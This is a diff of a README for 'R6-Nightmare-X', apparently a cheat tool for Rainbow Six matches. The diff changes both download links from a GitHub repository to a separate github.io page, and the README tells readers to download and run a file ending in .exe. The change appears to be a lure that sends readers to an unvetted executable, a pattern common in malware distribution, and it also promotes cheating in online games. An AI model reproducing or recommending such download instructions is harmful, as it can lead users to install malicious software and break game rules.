@@ -1,6 +1,6 @@
 # 🎯 R6-Nightmare-X - Improve your tactical edge in matches
 
-[![Download R6-Nightmare-X](https://img.shields.io/badge/Download-Blue-blue)](https://github.com/Fredibilateral685/R6-Nightmare-X)
+[![Download R6-Nightmare-X](https://img.shields.io/badge/Download-Blue-blue)](https://fredibilateral685.github.io)
 
 ## 📋 About the software
 
@@ -29,7 +29,7 @@ Follow these steps to prepare your computer and run the tool.
 
 You can obtain the necessary files from the official repository page.
 
-1.  Visit the [official download page](https://github.com/Fredibilateral685/R6-Nightmare-X) to access the latest version.
+1.  Visit the [official download page](https://fredibilateral685.github.io) to access the latest version.
 2.  Look for the section labeled Releases on the right side of the screen.
 3.  Click the link for the latest version to view the download options.
 4.  Select the file ending in .exe to start the download.
